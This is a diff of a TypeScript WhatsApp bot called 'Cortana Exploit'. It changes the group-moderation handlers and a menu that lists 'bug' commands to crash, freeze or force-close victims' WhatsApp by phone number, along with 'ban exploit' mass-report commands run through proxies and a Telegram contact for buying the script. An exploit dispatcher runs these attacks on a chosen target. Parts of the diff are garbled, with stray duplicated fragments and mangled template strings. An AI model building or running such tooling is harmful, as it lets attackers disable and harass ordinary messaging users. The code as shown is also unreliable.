@@ -976,13 +976,13 @@ _Caught by Cortana before it vanished_ 😈`;
                 }
 
                 // ═══════════════════════════════════════════════════════════
-                // 📢 ANTIGROUPMENTION - Detects @everyone/group mention
+                // 📢 ANTIGROUPMENTION - Detects Group Mentions (Status Mentions)
                 // ═══════════════════════════════════════════════════════════
-                const groupMention = msg.message.extendedTextMessage?.contextInfo?.groupMentions || [];
-                const hasGroupMention = groupMention.length > 0 || body.includes('@everyone');
+                const groupMentions = msg.message?.extendedTextMessage?.contextInfo?.groupMentions || [];
+                const hasGroupMention = groupMentions.length > 0;
 
-                if (groupSettings.antigroupmentionMode !== 'off' && hasGroupMention) {
-                  console.log(`[ANTIGROUPMENTION] 📢 Group mention detected from @${sender.split('@')[0]}`);
+                if (groupSettings.antigroupmentionMode && groupSettings.antigroupmentionMode !== 'off' && hasGroupMention) {
+                  console.log(`[ANTIGROUPMENTION] 📢 Group/Status mention detected from @${sender.split('@')[0]}`);
                   await safeSendMessage(sock, jid, { delete: msg.key });
 
                   if (isBotAdmin) {
@@ -991,14 +991,13 @@ _Caught by Cortana before it vanished_ 😈`;
                         await sock.groupParticipantsUpdate(jid, [sender], "remove");
                         await safeSendMessage(sock, jid, {
                           text: `╔══════════════════════════════╗
-║ 🌸 *GROUPMENTION DETECTED* 🌸║
+║ 🌸 *STATUS MENTION DETECTED* 🌸║
 ╠══════════════════════════════╣
-║ 📢 *@EVERYONE ABUSE = BAN* 📢║
+║ 📢 *GROUP MENTION = BAN*     ║
 ║                              ║
 ║ 👤 Target: @${sender.split('@')[0].padEnd(16)}║
-║ 📛 Status: *YEETED OUT* 🚀   ║
-║                              ║
-║ 🌺 _Don't ping the whole gc_ 🌺║
+║ 📛 Status: *DETECTED & KICKED*║
+║ 💐 _Don't mention this group_ 💐║
 ╚══════════════════════════════╝`,
                           mentions: [sender]
                         });
@@ -1008,31 +1007,27 @@ _Caught by Cortana before it vanished_ 😈`;
                     } else if (groupSettings.antigroupmentionMode === 'warn') {
                       await safeSendMessage(sock, jid, {
                         text: `╔══════════════════════════════╗
-║ 🌸 *GROUPMENTION WARNING* 🌸 ║
+║ 🌸 *STATUS MENTION WARNING* 🌸 ║
 ╠══════════════════════════════╣
-║  📢 *@EVERYONE DETECTED* 📢  ║
+║  📢 *GROUP MENTION DETECTED* 📢║
 ║                              ║
 ║ 👤 Offender: @${sender.split('@')[0].padEnd(14)}║
 ║ 🚨 Status: *FINAL WARNING*   ║
 ║                              ║
-║ 💐 _One more = GONE_ 💐      ║
+║ 💐 _Don't do it again_ 💐    ║
 ╚══════════════════════════════╝`,
                         mentions: [sender]
                       });
                     }
                   } else {
-                    // Bot is NOT admin - request promotion
                     await safeSendMessage(sock, jid, {
                       text: `╔══════════════════════════════╗
-║ 🌸 *GROUPMENTION DETECTED* 🌸║
-╠══════════════════════════════╣
-║ 📢 *@EVERYONE ABUSE!*        ║
+║ 🌸 *STATUS MENTION DETECTED* 🌸║
 ║                              ║
 ║ 👤 Culprit: @${sender.split('@')[0].padEnd(15)}║
 ║                              ║
 ║ ❌ *I NEED ADMIN POWERS!* ❌  ║
 ║ 🌺 Promote me to punish this ║
-║    mention-spamming MF! 💀   ║
 ╚══════════════════════════════╝`,
                       mentions: [sender]
                     });
@@ -1040,28 +1035,32 @@ _Caught by Cortana before it vanished_ 😈`;
                 }
 
                 // ═══════════════════════════════════════════════════════════
-                // 🏷️ ANTITAGALL - Detects .tagall/.tagadmins command usage
+                // 🏷️ ANTITAGALL - Detects .tagall, .hidetag, @everyone
                 // ═══════════════════════════════════════════════════════════
                 const tagallCommands = ['.tagall', '.hidetag', '.tagadmins', '.tag-all', '.mentionall', '.everyone'];
-                const isTagallAttempt = tagallCommands.some(cmd => bodyLower.startsWith(cmd));
+                const isTagallCommand = tagallCommands.some(cmd => bodyLower.startsWith(cmd));
+                const isEveryoneMention = body.includes('@everyone');
+                const isTagallAttempt = isTagallCommand || isEveryoneMention;
 
-                if (groupSettings.antigroupmentionMode !== 'off' && isTagallAttempt) {
-                  console.log(`[ANTITAGALL] 🏷️ Tagall command detected from @${sender.split('@')[0]}: ${body}`);
+                // Default to 'off' if undefined
+                const antitagMode = groupSettings.antitagallMode || 'off';
+
+                if (antitagMode !== 'off' && isTagallAttempt) {
+                  console.log(`[ANTITAGALL] 🏷️ Tagall/Everyone detected from @${sender.split('@')[0]}`);
                   await safeSendMessage(sock, jid, { delete: msg.key });
 
                   if (isBotAdmin) {
-                    if (groupSettings.antigroupmentionMode === 'kick') {
+                    if (antitagMode === 'kick') {
                       try {
                         await sock.groupParticipantsUpdate(jid, [sender], "remove");
                         await safeSendMessage(sock, jid, {
                           text: `╔══════════════════════════════╗
-║  🌸 *TAGALL DETECTED* 🌸     ║
+║  🌸 *ANTITAGALL DETECTED* 🌸 ║
 ╠══════════════════════════════╣
-║ 🏷️ *TAGALL CMD = INSTANT BAN*║
+║ 🏷️ *TAGALL/@EVERYONE = BAN*  ║
 ║                              ║
 ║ 👤 Target: @${sender.split('@')[0].padEnd(16)}║
 ║ 💀 Status: *EXTERMINATED*    ║
-║ 📝 Cmd: ${body.slice(0, 20).padEnd(20)}║
 ║                              ║
 ║ 🌺 _No mass tags allowed_ 🌺 ║
 ╚══════════════════════════════╝`,
@@ -1070,16 +1069,37 @@ _Caught by Cortana before it vanished_ 😈`;
                       } catch (kickErr) {
                         console.error('[ANTITAGALL] Failed to kick:', kickErr);
                       }
-                    } else if (groupSettings.antigroupmentionMode === 'warn') {
+                    } else if (antitagMode === 'warn') {
                       await safeSendMessage(sock, jid, {
                         text: `╔══════════════════════════════╗
-║   🌸 *TAGALL WARNING* 🌸     ║
+║   🌸 *ANTITAGALL WARNING* 🌸 ║
 ╠══════════════════════════════╣
-║  🏷️ *TAGALL COMMAND BLOCKED* ║
+║  🏷️ *TAGALL/@EVERYONE DETECTED*║
 ║                              ║
 ║ 👤 Offender: @${sender.split('@')[0].padEnd(14)}║
 ║ 🚨 Status: *WARNED*          ║
-║ 📝 Cmd: ${body.slice(0, 20).padEnd(20)}║
+║                              ║
+║ 💐 _Use it at your own risk_ 💐║
+╚══════════════════════════════╝`,
+                        mentions: [sender]
+                      });
+                    }
+                  } else {
+                    await safeSendMessage(sock, jid, {
+                      text: `╔══════════════════════════════╗
+║ 🌸 *ANTITAGALL DETECTED* 🌸  ║
+║                              ║
+║ 👤 Culprit: @${sender.split('@')[0].padEnd(15)}║
+║                              ║
+║ ❌ *I NEED ADMIN POWERS!* ❌  ║
+║ 🌺 Promote me to punish this ║
+╚══════════════════════════════╝`,
+                      mentions: [sender]
+                    });
+                  }
+                }
+║ 🚨 Status: * WARNED *          ║
+║ 📝 Cmd: ${ body.slice(0, 20).padEnd(20) }║
 ║                              ║
 ║ 💐 _Next = REMOVAL_ 💐       ║
 ╚══════════════════════════════╝`,
@@ -1090,16 +1110,16 @@ _Caught by Cortana before it vanished_ 😈`;
                     // Bot is NOT admin - request promotion
                     await safeSendMessage(sock, jid, {
                       text: `╔══════════════════════════════╗
-║  🌸 *TAGALL DETECTED* 🌸     ║
+║  🌸 * TAGALL DETECTED * 🌸     ║
 ╠══════════════════════════════╣
-║ 🏷️ *TAGALL CMD DETECTED!*    ║
+║ 🏷️ * TAGALL CMD DETECTED! *    ║
 ║                              ║
-║ 👤 Culprit: @${sender.split('@')[0].padEnd(15)}║
-║ 📝 Cmd: ${body.slice(0, 20).padEnd(20)}║
+║ 👤 Culprit: @${ sender.split('@')[0].padEnd(15) }║
+║ 📝 Cmd: ${ body.slice(0, 20).padEnd(20) }║
 ║                              ║
-║ ❌ *I NEED ADMIN POWERS!* ❌  ║
+║ ❌ * I NEED ADMIN POWERS! * ❌  ║
 ║ 🌺 Promote me to eliminate   ║
-║    this tag-spamming MF! 💀  ║
+║    this tag - spamming MF! 💀  ║
 ╚══════════════════════════════╝`,
                       mentions: [sender]
                     });
@@ -1176,7 +1196,7 @@ _Caught by Cortana before it vanished_ 😈`;
             const hours = Math.floor(uptime / 3600);
             const minutes = Math.floor((uptime % 3600) / 60);
             const seconds = Math.floor(uptime % 60);
-            const uptimeStr = `${hours}h ${minutes}m ${seconds}s`;
+            const uptimeStr = `${ hours }h ${ minutes }m ${ seconds } s`;
 
             // Calculate Greeting with emojis
             const hour = new Date().getHours();
@@ -1198,7 +1218,7 @@ _Caught by Cortana before it vanished_ 😈`;
 
             // Send initial loading message
             const loadingMsg = await safeSendMessage(sock, jid, {
-              text: `☠️ *CORTANA EXPLOIT*\nInitializing... [░░░░░░░░░░] 0%`
+              text: `☠️ * CORTANA EXPLOIT *\nInitializing...[░░░░░░░░░░] 0 % `
             });
             const loadingKey = loadingMsg?.key;
 
@@ -1207,13 +1227,13 @@ _Caught by Cortana before it vanished_ 😈`;
               for (const step of loadingSteps) {
                 await new Promise(resolve => setTimeout(resolve, step.delay));
                 await safeSendMessage(sock, jid, {
-                  text: `☠️ *CORTANA EXPLOIT*\nLoading... [${step.bar}] ${step.percent}%`,
+                  text: `☠️ * CORTANA EXPLOIT *\nLoading...[${ step.bar }] ${ step.percent } % `,
                   edit: loadingKey
                 });
               }
               await new Promise(resolve => setTimeout(resolve, 300));
               await safeSendMessage(sock, jid, {
-                text: `☠️ *CORTANA EXPLOIT*\n✅ Ready! Loading menu...`,
+                text: `☠️ * CORTANA EXPLOIT *\n✅ Ready! Loading menu...`,
                 edit: loadingKey
               });
               await new Promise(resolve => setTimeout(resolve, 500));
@@ -1225,25 +1245,25 @@ _Caught by Cortana before it vanished_ 😈`;
             const menuImage = "https://files.catbox.moe/rras91.jpg";
 
             // Page 0: Bot Info (compact)
-            const page0 = `☠️ *CORTANA EXPLOIT* ☠️
+            const page0 = `☠️ * CORTANA EXPLOIT * ☠️
 ━━━━━━━━━━━━━━━━
-🤖 *BOT:* CORTANA GEN III
-👑 *OWNER:* EDUQARIZ  
-⏱️ *UPTIME:* ${uptimeStr}
+🤖 * BOT:* CORTANA GEN III
+👑 * OWNER:* EDUQARIZ  
+⏱️ * UPTIME:* ${ uptimeStr }
 ━━━━━━━━━━━━━━━━
-${greeting}, ${pushName}!
-📲 t.me/eduqariz
+        ${ greeting }, ${ pushName }!
+📲 t.me / eduqariz
 © 2026`;
 
             // Page 1: Forcelose Bug - ALL aliases
             const page1 = `𝐅͢𝐨͠𝐫͡𝐜͠𝐞͡𝐥͢𝐨͠𝐬͡𝐞 𝐁͢𝐮͠𝐠
 ━━━━━━━━━━━
-▢ .oneterm <num>
-   (alias: elmionemsg)
-▢ .trashem <num>
-   (alias: elmitrash)
-▢ .cortanacall <num>
-   (alias: elmicall)
+▢ .oneterm<num>
+          (alias: elmionemsg)
+▢ .trashem<num>
+          (alias: elmitrash)
+▢ .cortanacall<num>
+          (alias: elmicall)
 ━━━━━━━━━━━
 📋 Usage: .cmd 628xxx
 © 2026 CORTANA`;
@@ -1251,12 +1271,12 @@ ${greeting}, ${pushName}!
             // Page 2: Crash Home Bug - ALL aliases
             const page2 = `𝐂͢𝐫͠𝐚͡𝐬͠𝐡 𝐇͠𝐨͡𝐦͢𝐞 𝐁͢𝐮͠𝐠
 ━━━━━━━━━━━
-▢ .newyear <num>
-   (alias: elmixcrash)
-▢ .cortana-blank <num>
-   (alias: elmiblanking)
-▢ .edudevice <num>
-   (alias: elmidevice)
+▢ .newyear<num>
+          (alias: elmixcrash)
+▢ .cortana - blank<num>
+          (alias: elmiblanking)
+▢ .edudevice<num>
+          (alias: elmidevice)
 ━━━━━━━━━━━
 📋 Usage: .cmd 628xxx
 © 2026 CORTANA`;
@@ -1264,12 +1284,12 @@ ${greeting}, ${pushName}!
             // Page 3: Delay Hard Bug - ALL aliases
             const page3 = `𝐃͢𝐞͠𝐥͡𝐚͠𝐲 𝐇͢𝐚͠𝐫͡𝐝 𝐁͢𝐮͠𝐠
 ━━━━━━━━━━━
-▢ .cortanazap <num>
-   (alias: elmizap)
-▢ .kindiki <num>
-   (alias: elmitravas)
-▢ .zeroreturn <num>
-   (alias: elmighost)
+▢ .cortanazap<num>
+          (alias: elmizap)
+▢ .kindiki<num>
+          (alias: elmitravas)
+▢ .zeroreturn<num>
+          (alias: elmighost)
 ━━━━━━━━━━━
 📋 Usage: .cmd 628xxx
 © 2026 CORTANA`;
@@ -1277,11 +1297,11 @@ ${greeting}, ${pushName}!
             // Page 4: Group Bug
             const page4 = `𝐆͢𝐫͠𝐨͡𝐮͢𝐩 𝐁͢𝐮͠𝐠
 ━━━━━━━━━━━
-▢ .kufeni (in-group)
-   (alias: kanjut)
-▢ .cookall (in-group)
-   (alias: maklo, tobrut)
-▢ .fuckgc (in-group)
+▢ .kufeni(in -group)
+          (alias: kanjut)
+▢ .cookall(in -group)
+          (alias: maklo, tobrut)
+▢ .fuckgc(in -group)
 ━━━━━━━━━━━
 ⚠️ Use IN target group!
 © 2026 CORTANA`;
@@ -1289,12 +1309,12 @@ ${greeting}, ${pushName}!
             // Page 5: Ban Exploits
             const page5 = `𝐁͢𝐚͠𝐧 𝐄͡𝐱͢𝐩͠𝐥͡𝐨͢𝐢͠𝐭͡𝐬
 ━━━━━━━━━━━
-▢ .perm-ban-num <num>
-   (Uses 2847+ proxies)
-▢ .temp-ban-num <num>
-   (Heavy intensity)
+▢ .perm - ban - num<num>
+          (Uses 2847 + proxies)
+▢ .temp - ban - num<num>
+          (Heavy intensity)
 ━━━━━━━━━━━
-⏳ Takes 10+ minutes
+⏳ Takes 10 + minutes
 © 2026 CORTANA`;
 
             // Page 6: Owner Commands
@@ -1310,8 +1330,8 @@ ${greeting}, ${pushName}!
             // Page 7: Panel & Script
             const page7 = `𝐏͢𝐚͠𝐧͡𝐞͢𝐥 & 𝐒͠𝐜͡𝐫͢𝐢͠𝐩͡𝐭
 ━━━━━━━━━━━
-💰 Buy Script/Panel
-📲 t.me/eduqariz
+💰 Buy Script / Panel
+📲 t.me / eduqariz
 ▢ .buysc
 ━━━━━━━━━━━
 © 2026 CORTANA`;
@@ -1319,22 +1339,22 @@ ${greeting}, ${pushName}!
             // Page 8: Cortana Fun
             const page8 = `𝐂͢𝐨͠𝐫͡𝐭͠𝐚͢𝐧͠𝐚 𝐅͢𝐮͠𝐧
 ━━━━━━━━━━━
-▢ .tiktok <url>
-▢ .pinterest <query>
-▢ .mediafire <url>
+▢ .tiktok<url>
+▢ .pinterest<query>
+▢ .mediafire<url>
 ▢ .hidetag / .tagall
 ▢ .kick / .promote
 ▢ .demote / .swgc
-▢ .antilinkgc on/off
+▢ .antilinkgc on / off
 ━━━━━━━━━━━
 © 2026 CORTANA`;
 
             // Page 9: Other Utilities
             const page9 = `𝐎͢𝐭͠𝐡͡𝐞͢𝐫 𝐔͠𝐭͡𝐢͢𝐥͠𝐢͡𝐭͢𝐢͠𝐞͡𝐬
 ━━━━━━━━━━━
-▢ .tourl (reply media)
-▢ .vv (view once reveal)
-   (alias: rvo)
+▢ .tourl(reply media)
+▢ .vv(view once reveal)
+          (alias: rvo)
 ▢ .idch / .cekganteng
 ▢ .cekkhodam / .kapan
 ━━━━━━━━━━━
@@ -1409,7 +1429,7 @@ ${greeting}, ${pushName}!
 
               // Fallback: Send as single image with all pages combined
               try {
-                const allPages = `${page0}\n\n${page1}\n\n${page2}\n\n${page3}\n\n${page4}\n\n${page5}`;
+                const allPages = `${ page0 }\n\n${ page1 }\n\n${ page2 }\n\n${ page3 }\n\n${ page4 }\n\n${ page5 }`;
                 await sock.sendMessage(jid, {
                   image: { url: menuImage },
                   caption: allPages,
@@ -1491,64 +1511,64 @@ ${greeting}, ${pushName}!
                 }
               }
 
-              console.log(`[EXPLOIT] Executing ${command} on ${target} by owner: ${senderNumber} `);
+              console.log(`[EXPLOIT] Executing ${ command } on ${ target } by owner: ${ senderNumber } `);
 
               // Send executing message with better formatting
               const startMsg = await safeSendMessage(sock, jid, {
                 text: `☠️ * CORTANA EXPLOIT INITIATED *\n\n` +
                   `🎯 Target: \`${target.split('@')[0]}\`\n` +
-                  `⚔️ Command: ${command.toUpperCase()}\n` +
-                  `⏳ Status: Deploying...\n\n` +
-                  `_Please wait, this may take some time..._`
+      `⚔️ Command: ${command.toUpperCase()}\n` +
+      `⏳ Status: Deploying...\n\n` +
+      `_Please wait, this may take some time..._`
               });
 
-              const startTime = Date.now();
+    const startTime = Date.now();
 
-              try {
-                const result = await executeExploit(sock, command, target);
-                const duration = Math.floor((Date.now() - startTime) / 1000);
+    try {
+      const result = await executeExploit(sock, command, target);
+      const duration = Math.floor((Date.now() - startTime) / 1000);
 
-                if (result) {
-                  await safeSendMessage(sock, jid, {
-                    text: `✅ *EXPLOIT COMPLETED*\n\n` +
-                      `🎯 Target: \`${target.split('@')[0]}\`\n` +
-                      `⚔️ Command: ${command.toUpperCase()}\n` +
-                      `⏱️ Duration: ${duration}s\n` +
-                      `💀 Status: Successfully delivered!\n\n` +
-                      `_Check target status now._`
-                  });
-                } else {
-                  await safeSendMessage(sock, jid, {
-                    text: `⚠️ *EXPLOIT WARNING*\n\n` +
-                      `🎯 Target: \`${target.split('@')[0]}\`\n` +
-                      `⚔️ Command: ${command.toUpperCase()}\n` +
-                      `⏱️ Duration: ${duration}s\n\n` +
-                      `Exploit may have partially executed.\nCheck target status.`
-                  });
-                }
-              } catch (error: any) {
-                const duration = Math.floor((Date.now() - startTime) / 1000);
-                console.error(`[EXPLOIT] Error executing ${command}:`, error);
-                await safeSendMessage(sock, jid, {
-                  text: `❌ *EXPLOIT FAILED*\n\n` +
-                    `🎯 Target: \`${target.split('@')[0]}\`\n` +
-                    `⚔️ Command: ${command.toUpperCase()}\n` +
-                    `⏱️ Duration: ${duration}s\n` +
-                    `⚠️ Error: \`${error.message || 'Unknown error'}\`\n\n` +
-                    `_The exploit encountered an error. Try again or use a different attack._`
-                });
-              }
-            }
+      if (result) {
+        await safeSendMessage(sock, jid, {
+          text: `✅ *EXPLOIT COMPLETED*\n\n` +
+            `🎯 Target: \`${target.split('@')[0]}\`\n` +
+            `⚔️ Command: ${command.toUpperCase()}\n` +
+            `⏱️ Duration: ${duration}s\n` +
+            `💀 Status: Successfully delivered!\n\n` +
+            `_Check target status now._`
+        });
+      } else {
+        await safeSendMessage(sock, jid, {
+          text: `⚠️ *EXPLOIT WARNING*\n\n` +
+            `🎯 Target: \`${target.split('@')[0]}\`\n` +
+            `⚔️ Command: ${command.toUpperCase()}\n` +
+            `⏱️ Duration: ${duration}s\n\n` +
+            `Exploit may have partially executed.\nCheck target status.`
+        });
+      }
+    } catch (error: any) {
+      const duration = Math.floor((Date.now() - startTime) / 1000);
+      console.error(`[EXPLOIT] Error executing ${command}:`, error);
+      await safeSendMessage(sock, jid, {
+        text: `❌ *EXPLOIT FAILED*\n\n` +
+          `🎯 Target: \`${target.split('@')[0]}\`\n` +
+          `⚔️ Command: ${command.toUpperCase()}\n` +
+          `⏱️ Duration: ${duration}s\n` +
+          `⚠️ Error: \`${error.message || 'Unknown error'}\`\n\n` +
+          `_The exploit encountered an error. Try again or use a different attack._`
+      });
+    }
+  }
           }
         }
       }); // End of on('messages.upsert')
     }
 
-    return sock;
+return sock;
   } catch (err) {
-    console.error(`startSocket failed for ${sessionId}:`, err);
-    throw err;
-  }
+  console.error(`startSocket failed for ${sessionId}:`, err);
+  throw err;
+}
 }
 
 export async function requestPairingCode(phoneNumber: string, type: 'md' | 'bug' = 'md', createdBy?: string): Promise<{ sessionId: string; pairingCode: string }> {
